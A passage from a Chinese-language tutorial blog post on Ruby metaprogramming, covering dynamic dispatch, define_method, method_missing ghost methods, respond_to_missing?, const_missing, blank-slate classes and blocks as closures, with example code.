<h4 id="重构Computer类"><a href="#重构Computer类" class="headerlink" title="重构Computer类"></a>重构Computer类</h4><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">Computer</span>
	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">initialize</span></span><span class="token punctuation">(</span>computer_id<span class="token punctuation">,</span>data_source<span class="token punctuation">)</span>
		<span class="token variable">@id</span> <span class="token operator">=</span> computer_id
		<span class="token variable">@data_source</span> <span class="token operator">=</span> data_source
	<span class="token keyword">end</span>

	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">mouse</span></span>
		companent <span class="token symbol">:mouse</span>
	<span class="token keyword">end</span>

	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">cpu</span></span>
		companent <span class="token symbol">:cpu</span>
	<span class="token keyword">end</span>

	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">companent</span></span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>
    <span class="token comment"># 这里使用了动态调用方法</span>
		info <span class="token operator">=</span> <span class="token variable">@data_source</span><span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"get_</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">name</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">_info"</span></span><span class="token punctuation">,</span><span class="token variable">@id</span><span class="token punctuation">)</span>
		price <span class="token operator">=</span> <span class="token variable">@data_source</span><span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"get_</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">name</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">_price"</span></span><span class="token punctuation">,</span><span class="token variable">@id</span><span class="token punctuation">)</span>
		result <span class="token operator">=</span> <span class="token string-literal"><span class="token string">"</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">name</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">: </span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">info</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string"> : (</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">price</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">)"</span></span>
		result <span class="token operator">=</span> <span class="token string-literal"><span class="token string">"*"</span></span> <span class="token operator">+</span> result <span class="token keyword">if</span> price <span class="token operator">></span> <span class="token number">99</span>
		<span class="token keyword">return</span> result
	<span class="token keyword">end</span>
	<span class="token comment"># ... 类似操作</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>​    我们使用动态派发的方式，抽离出一个公共组件，其他配件可以直接使用，代码量减少的多</p>
<p>​    我们再用<strong>动态定义方法</strong>去试着重构一下代码    </p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">Computer</span>
	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">initialize</span></span><span class="token punctuation">(</span>computer_id<span class="token punctuation">,</span>data_source<span class="token punctuation">)</span>
		<span class="token variable">@id</span> <span class="token operator">=</span> computer_id
		<span class="token variable">@data_source</span> <span class="token operator">=</span> data_source
	<span class="token keyword">end</span>

	<span class="token comment"># 这里定义一个类方法，这里的self指向的是Computer类常量</span>
	<span class="token keyword">def</span> <span class="token method-definition"><span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">define_companent</span></span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> 
		<span class="token comment"># 根据传入的Symbol，创建相应的方法</span>
		<span class="token keyword">define_method</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token keyword">do</span>
			info <span class="token operator">=</span> <span class="token variable">@data_source</span><span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"get_</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">name</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">_info"</span></span><span class="token punctuation">,</span><span class="token variable">@id</span><span class="token punctuation">)</span>
			price <span class="token operator">=</span> <span class="token variable">@data_source</span><span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"get_</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">name</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">_price"</span></span><span class="token punctuation">,</span><span class="token variable">@id</span><span class="token punctuation">)</span>
			result <span class="token operator">=</span> <span class="token string-literal"><span class="token string">"</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">name</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">: </span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">info</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string"> : (</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">price</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">)"</span></span>
			result <span class="token operator">=</span> <span class="token string-literal"><span class="token string">"*"</span></span> <span class="token operator">+</span> result <span class="token keyword">if</span> price <span class="token operator">></span> <span class="token number">99</span>
			<span class="token keyword">return</span> result
		<span class="token keyword">end</span>
	<span class="token keyword">end</span>
	<span class="token comment">## 这里主动调用 并动态创建对应的方法</span>
	define_companent <span class="token symbol">:mouse</span>
	define_companent <span class="token symbol">:cpu</span>
	define_companent <span class="token symbol">:keyboard</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>现在Computer已经剩不了多少代码了，我们使用内省方式缩减代码</p>
</blockquote>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">Computer</span>
	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">initialize</span></span><span class="token punctuation">(</span>computer_id<span class="token punctuation">,</span>data_source<span class="token punctuation">)</span>
		<span class="token variable">@id</span> <span class="token operator">=</span> computer_id
		<span class="token variable">@data_source</span> <span class="token operator">=</span> data_source
    <span class="token comment"># 主动根据DS中给定的访问方法，创建访问方法，而不需要我们再去手动控制</span>
		data_source<span class="token punctuation">.</span>methods<span class="token punctuation">.</span>grep<span class="token punctuation">(</span><span class="token operator">/</span><span class="token operator">^</span>get_<span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token operator">*</span><span class="token punctuation">)</span>_info$<span class="token operator">/</span> <span class="token operator">|</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token comment"># 被正则表达式匹配到的方法，会依次调用这里传递的块儿，并将内容封装到 $1 全局变量中</span>
			Computer<span class="token punctuation">.</span>define_companent $<span class="token number">1</span>
		<span class="token punctuation">&#125;</span>
	<span class="token keyword">end</span>

	<span class="token keyword">def</span> <span class="token method-definition"><span class="token keyword">self</span><span class="token punctuation">.</span><span class="token function">define_companent</span></span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>
		<span class="token keyword">define_method</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token keyword">do</span>
			info <span class="token operator">=</span> <span class="token variable">@data_source</span><span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"get_</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">name</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">_info"</span></span><span class="token punctuation">,</span><span class="token variable">@id</span><span class="token punctuation">)</span>
			price <span class="token operator">=</span> <span class="token variable">@data_source</span><span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"get_</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">name</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">_price"</span></span><span class="token punctuation">,</span><span class="token variable">@id</span><span class="token punctuation">)</span>
			result <span class="token operator">=</span> <span class="token string-literal"><span class="token string">"</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">name</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">: </span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">info</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string"> : (</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">price</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">)"</span></span>
			result <span class="token operator">=</span> <span class="token string-literal"><span class="token string">"*"</span></span> <span class="token operator">+</span> result <span class="token keyword">if</span> price <span class="token operator">></span> <span class="token number">99</span>
			<span class="token keyword">return</span> result
		<span class="token keyword">end</span>
	<span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>​    我们在初始化方法中加入几场代码就可以让代码更加简洁。</p>
<h3 id="method-missing方法"><a href="#method-missing方法" class="headerlink" title="method_missing方法"></a>method_missing方法</h3><blockquote>
<p>你将学习幽灵方法和动态代理</p>
</blockquote>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">User</span>
	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">method_missing</span></span><span class="token punctuation">(</span>method<span class="token punctuation">,</span><span class="token operator">*</span>args<span class="token punctuation">)</span>
		puts <span class="token string-literal"><span class="token string">"You called: </span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">method</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string"> (</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">args<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">','</span></span><span class="token punctuation">)</span></span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">)"</span></span>
    puts <span class="token string-literal"><span class="token string">"(You alse passed it a block)"</span></span> <span class="token keyword">if</span> block_given<span class="token operator">?</span>
    
	<span class="token keyword">end</span>
<span class="token keyword">end</span>

obj <span class="token operator">=</span> <span class="token class-name">User</span><span class="token punctuation">.</span><span class="token keyword">new</span> 
obj<span class="token punctuation">.</span>hi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>​    在Ruby中我们可以随意调用一个方法，而这个方法可能根本不存在，当运行时在当前对象的继承链上都没有找到这个方法时，会去找当前对象的 method_missing 方法，它就好像每个无家可归的人最终的点，method_missing是<code>BasicObject</code>中定义的私有实例方法，所以每个子类都可以使用这个方法，而BasicObject中是直接抛出这个异常，所以需要我们自己去重写。<code>method_missing</code>也叫做幽灵方法。</p>
<blockquote>
<p>现在我们通过method_missing来重构我们的Computer类</p>
</blockquote>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">Computer</span>
	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">initialize</span></span><span class="token punctuation">(</span>computer_id<span class="token punctuation">,</span>data_source<span class="token punctuation">)</span>
		<span class="token variable">@id</span> <span class="token operator">=</span> computer_id
		<span class="token variable">@data_source</span> <span class="token operator">=</span> data_source
	<span class="token keyword">end</span>
	<span class="token comment"># name 为 调用的方法名，args 表示参数 ，*表示接受所有的参数,封装为一个数组</span>
	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">method_miss</span></span><span class="token punctuation">(</span>name<span class="token punctuation">,</span><span class="token operator">*</span>args<span class="token punctuation">)</span>
		<span class="token comment"># 判断@data_source是否有这个方法？如果没有则调用super.method_miss,也就是未找到该方法</span>
		<span class="token keyword">super</span> <span class="token keyword">if</span> <span class="token operator">!</span><span class="token variable">@data_source</span><span class="token punctuation">.</span>respond_to<span class="token operator">?</span><span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"get_</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">name</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">_info"</span></span><span class="token punctuation">)</span>
		<span class="token comment"># 如果有这个方法</span>
		info <span class="token operator">=</span> <span class="token variable">@data_source</span><span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"get_</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">name</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">_info"</span></span><span class="token punctuation">,</span><span class="token variable">@id</span><span class="token punctuation">)</span>
		price <span class="token operator">=</span> <span class="token variable">@data_source</span><span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"get_</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">name</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">_price"</span></span><span class="token punctuation">,</span><span class="token variable">@id</span><span class="token punctuation">)</span>
		result <span class="token operator">=</span> <span class="token string-literal"><span class="token string">"</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">name</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">: </span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">info</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string"> : (</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">price</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">)"</span></span>
		result <span class="token operator">=</span> <span class="token string-literal"><span class="token string">"*"</span></span> <span class="token operator">+</span> result <span class="token keyword">if</span> price <span class="token operator">></span> <span class="token number">99</span>
		<span class="token keyword">return</span> result
	<span class="token keyword">end</span>
<span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>​    现在发现我们不需要再定义额外的方法了，直接通过幽灵方法来做判断与返回，这里方法：<code>respond_to?</code>表示该实例是否有目标方法，</p>
<p>​    如果方法返回值为Boolean，一般会在方法名定义时使用<code>?</code>,如：<code>def is_black?()</code>表示。</p>
<h4 id="respond-to-missing方法"><a href="#respond-to-missing方法" class="headerlink" title="respond_to_missing方法"></a>respond_to_missing方法</h4><blockquote>
<p>如何问Computer对象是否响应幽灵方法？ </p>
</blockquote>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby">cmp <span class="token operator">=</span> <span class="token class-name">Computer</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token class-name">DS</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">)</span>
cmp<span class="token punctuation">.</span>respond_to<span class="token operator">?</span><span class="token punctuation">(</span><span class="token symbol">:mouse</span><span class="token punctuation">)</span>   <span class="token comment"># => false </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>​    无法响应到，因为 :mouse是一个幽灵方法，我们需要重新定义<code>respond_to_missing()</code></p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">Computer</span>
  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">respond_to_missing</span></span><span class="token operator">?</span><span class="token punctuation">(</span>method<span class="token punctuation">,</span>include_private<span class="token operator">=</span><span class="token boolean">false</span><span class="token punctuation">)</span>
    <span class="token variable">@data_source</span><span class="token punctuation">.</span>respond_to<span class="token operator">?</span><span class="token punctuation">(</span><span class="token string-literal"><span class="token string">"get_</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">method</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">_info"</span></span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token keyword">super</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span>

cmp <span class="token operator">=</span> <span class="token class-name">Computer</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token class-name">DS</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">)</span>
cmp<span class="token punctuation">.</span>respond_to<span class="token operator">?</span><span class="token punctuation">(</span><span class="token symbol">:mouse</span><span class="token punctuation">)</span>   <span class="token comment"># => true</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>​    所以正确的做法是每次覆写<code>method_missing</code>时，同时也覆写<code>respond_to_missing?</code>方法</p>
<h4 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h4><p>​    通常，幽灵方法都是锦上添花的左右，不过有些对象的功能，几乎完全依赖于他，这些对象通常是一些封装对象，他们封装的可以是另一个对象，web服务或者其他语言写成的代码，这些对象通过method_missing方法收集方法调用，并把这些调用转发到被封装的对象上</p>
<h4 id="const-missing方法"><a href="#const-missing方法" class="headerlink" title="const_missing方法"></a>const_missing方法</h4><p>​    如果对于一个常量的引用发现找不到，则会默认调用<code>const_missing</code>方法，将常量名作为一个符号进行传递。</p>
<p>​    在Rake中就有使用，为了兼容老版本的Task和新版本的Rake::Task。 </p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">module</span> <span class="token class-name">Rake</span>
  <span class="token keyword">class</span> <span class="token class-name">Task</span><span class="token punctuation">;</span> <span class="token keyword">end</span>
  <span class="token keyword">class</span> <span class="token class-name">FileTask</span><span class="token punctuation">;</span> <span class="token keyword">end</span>
<span class="token keyword">end</span>

<span class="token keyword">class</span> <span class="token class-name">Module</span>
  <span class="token keyword">def</span> <span class="token method-definition"><span class="token function">const_missing</span></span><span class="token punctuation">(</span>const_name<span class="token punctuation">)</span>
    <span class="token keyword">case</span> const_name
    <span class="token keyword">when</span> <span class="token symbol">:Task</span>
      p <span class="token string-literal"><span class="token string">"提示：原有的Task，已经移入，Rake名称空间，请使用 Rake::Task"</span></span>
      Rake<span class="token double-colon punctuation">::</span>Task
    <span class="token keyword">when</span> <span class="token symbol">:FileTask</span>
      p <span class="token string-literal"><span class="token string">"提示：原有的Task，已经移入，Rake名称空间，请使用 Rake::FileTask"</span></span>
      Rake<span class="token double-colon punctuation">::</span>FileTask
    <span class="token keyword">end</span>
  <span class="token keyword">end</span>
<span class="token keyword">end</span>
<span class="token comment"># main是Object的实例，Object是Class的实例，Class的父类是Module，所以当我们使用猴子补丁修改</span>
<span class="token comment"># Module#const_missing时，main对象是继承到这个方法的。</span>
<span class="token comment"># 我们想要访问Task常量，发现并不存在，则触发了const_missing(const_name)</span>
p <span class="token class-name">Task</span><span class="token punctuation">.</span><span class="token keyword">new</span>
p <span class="token class-name">FileTask</span><span class="token punctuation">.</span><span class="token keyword">new</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="method-missing隐藏Bug"><a href="#method-missing隐藏Bug" class="headerlink" title="method_missing隐藏Bug"></a>method_missing隐藏Bug</h4><blockquote>
<p>我们设计一个按照人名，抽号码的小程序</p>
</blockquote>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">Roulette</span>
	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">method_missing</span></span><span class="token punctuation">(</span>name<span class="token punctuation">,</span><span class="token operator">*</span>args<span class="token punctuation">)</span>
		person <span class="token operator">=</span> name<span class="token punctuation">.</span>to_s<span class="token punctuation">.</span>capitalize
		<span class="token number">3.</span>times <span class="token keyword">do</span>
      <span class="token comment"># 这里在块儿内定义了number</span>
			number <span class="token operator">=</span> rand<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span>
			puts <span class="token string-literal"><span class="token string">"</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">number</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">..."</span></span>
		<span class="token keyword">end</span>
    <span class="token comment"># 这里又使用了number，因为作用域的不同，运行时找不到这个变量，所以默认会找 number这个方法，因为也没有这个方法，所以调用了method_missing方法，导致不断的重入</span>
		<span class="token string-literal"><span class="token string">"</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">name</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string"> got </span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">number</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span>
	<span class="token keyword">end</span>
<span class="token keyword">end</span>
number_of <span class="token operator">=</span> <span class="token class-name">Roulette</span><span class="token punctuation">.</span><span class="token keyword">new</span> 
p number_of<span class="token punctuation">.</span>bob	
p number_of<span class="token punctuation">.</span>Jack	<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>不知道你是否可以看出来？当程序运行时会不断方法重入，直到栈溢出。所以我们需要进行改良。</p>
</blockquote>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">class</span> <span class="token class-name">Roulette</span>
	<span class="token keyword">def</span> <span class="token method-definition"><span class="token function">method_missing</span></span><span class="token punctuation">(</span>name<span class="token punctuation">,</span><span class="token operator">*</span>args<span class="token punctuation">)</span>
		person <span class="token operator">=</span> name<span class="token punctuation">.</span>to_s<span class="token punctuation">.</span>capitalize
		<span class="token comment"># 判断是否名字是否存在，如果不存在，直接报错</span>
		<span class="token keyword">super</span> <span class="token keyword">unless</span> <span class="token string-literal"><span class="token string">%w[Bob Frank Bill]</span></span><span class="token punctuation">.</span><span class="token keyword">include</span><span class="token operator">?</span> person
    <span class="token comment"># 将局部变量作用域移出</span>
		number <span class="token operator">=</span> <span class="token number">0</span>
		<span class="token number">3.</span>times <span class="token keyword">do</span>
			number <span class="token operator">=</span> rand<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span>
			puts <span class="token string-literal"><span class="token string">"</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">number</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">..."</span></span>
		<span class="token keyword">end</span>
		<span class="token string-literal"><span class="token string">"</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">name</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string"> got </span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">number</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string">"</span></span>
	<span class="token keyword">end</span>
<span class="token keyword">end</span>
number_of <span class="token operator">=</span> <span class="token class-name">Roulette</span><span class="token punctuation">.</span><span class="token keyword">new</span> 
p number_of<span class="token punctuation">.</span>Bob	
p number_of<span class="token punctuation">.</span>Frank	<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="白板类"><a href="#白板类" class="headerlink" title="白板类"></a>白板类</h3><blockquote>
<p>​    比如说上面的 number_of.display 我们希望实际调用 method_missing 方法，但实际上可能调用了Object.display方法，这是因为我们从Object类中继承了大量的方法，所以时常导致<strong>幽灵方法与继承方法的重复</strong>。</p>
</blockquote>
<p>​    如果实例存在继承方法，则幽灵方法是失效的。我们有两个办法：</p>
<ol>
<li>删除继承来的方法</li>
<li>写一个白板类，也就是很干净了的类，没有继承的方法</li>
</ol>
<h4 id="白班类-：-BasicObject"><a href="#白班类-：-BasicObject" class="headerlink" title="白班类 ： BasicObject"></a>白班类 ： BasicObject</h4><p>​    BasicObject是Object的父类，其中定义的实例方法很少，所以我们可以让现有的类继承BasicObject，从而可以避免继承Object类的方法，这是最简单的白板类实现方法</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token comment"># [:__send__, :!, :instance_eval, :==, :instance_exec, :!=, :equal?, :__id__]</span>
p BasicObject<span class="token punctuation">.</span>instance_methods<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h4 id="删除方法"><a href="#删除方法" class="headerlink" title="删除方法"></a>删除方法</h4><ol>
<li>Module#undef_method  删除所有的方法，包括继承的</li>
<li>Module#remove_method 只删除接受者自己的方法</li>
</ol>
<p>所以我们最终可以选择让<code>Roulette 继承 BasicObject</code>，或者删除指定方法</p>
<h4 id="对比动态方法与幽灵方法"><a href="#对比动态方法与幽灵方法" class="headerlink" title="对比动态方法与幽灵方法"></a>对比动态方法与幽灵方法</h4><p>​    幽灵方法更容易出现隐性Bug，所以能使用动态方法，尽量使用动态方法，除非不得不使用时，才去使用，记住如果重写 response_to? ，也要重新 response_to_missing?</p>
<h2 id="代码块"><a href="#代码块" class="headerlink" title="代码块"></a>代码块</h2><blockquote>
<p>学习路线</p>
</blockquote>
<ul>
<li>代码块的基础知识</li>
<li>作用域的基础知识：用代码块携带变量穿越作用域</li>
<li>通过传递块给<code>instance_eval</code>方法来控制作用域</li>
<li>怎么把块转换为Proc和Lambda这样的可调用对象，供以后调用</li>
</ul>
<h3 id="代码块基础知识"><a href="#代码块基础知识" class="headerlink" title="代码块基础知识"></a>代码块基础知识</h3><pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">def</span> <span class="token method-definition"><span class="token function">a_method</span></span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span> 
  a<span class="token operator">+</span> <span class="token keyword">yield</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span>
<span class="token keyword">end</span>
a_method<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token operator">|</span>x<span class="token punctuation">,</span>y<span class="token operator">|</span> <span class="token punctuation">(</span>x<span class="token operator">+</span>y<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>​    代码块可以用大括号定义，也可以使用<code>do...end</code>关键字定义，通常如果一行的块使用大括号，而多行的块使用<code>do...end</code></p>
<p>​    块可以有自己的参数，比如上面的例子中的x和y，可以像调用方法那样为块提供参数，</p>
<p>​    可以通过<code>Kernel#block_given?</code>查看是否传达快，如果没有，调用yield则会报错</p>
<h3 id="代码块是闭包"><a href="#代码块是闭包" class="headerlink" title="代码块是闭包"></a>代码块是闭包</h3><blockquote>
<p>代码块可以把变量带出原来的作用域</p>
<p>代码块不能孤立的运行，它需要一个执行环境：局部变量，实例变量，self等</p>
<p>可以运行的代码由两部分组成：代码本身  和   一组绑定</p>
<p>当我们定义一个block时，它将获取到环境中的绑定，当block被传给一个方法时，他会带着这些绑定一起进入该方法</p>
</blockquote>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">def</span> <span class="token method-definition"><span class="token function">my_method</span></span>
  x <span class="token operator">=</span> <span class="token string-literal"><span class="token string">"Good"</span></span>
  <span class="token keyword">yield</span> <span class="token string-literal"><span class="token string">"cruel"</span></span>
<span class="token keyword">end</span>

x <span class="token operator">=</span> <span class="token string-literal"><span class="token string">"Bad"</span></span>
my_method <span class="token punctuation">&#123;</span><span class="token operator">|</span>y<span class="token operator">|</span> p <span class="token string-literal"><span class="token string">"</span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">x</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string"> , </span><span class="token interpolation"><span class="token delimiter punctuation">#&#123;</span><span class="token content">y</span><span class="token delimiter punctuation">&#125;</span></span><span class="token string"> World"</span></span><span class="token punctuation">&#125;</span>  <span class="token comment"># => "Bad , cruel World"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里我们调用my_method时，创建了一个block，并获取顶层上下文中的x变量，而my_method中定义的x变量对于block是不可见的，也可以在block中定义额外的绑定，但这些绑定在block结束时就消失了。</p>
<pre class="line-numbers language-ruby" data-language="ruby"><code class="language-ruby"><span class="token keyword">def</span> <span class="token method-definition"><span class="token function">just_yield</span></span>
  <span class="token keyword">yield</span>
<span class="token keyword">end</span>

top_leval_var <span class="token operator">=</span> <span class="token number">1</span>

just_yield <span class="token keyword">do</span>
  top_leval_var <span class="token operator">+=</span> <span class="token number">1</span>
  local_to_block <span class="token operator">=</span> <span class="token number">1</span>
<span class="token keyword">end</span>

p top_leval_var     <span class="token comment"># => 2</span>
p local_to_block    <span class="token comment"># => error!</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>​    基于这些特性，人们喜欢把代码块称为<strong>闭包</strong>，换句话说：代码块可以获取局部绑定，并一直带着他们</p>
<blockquote>
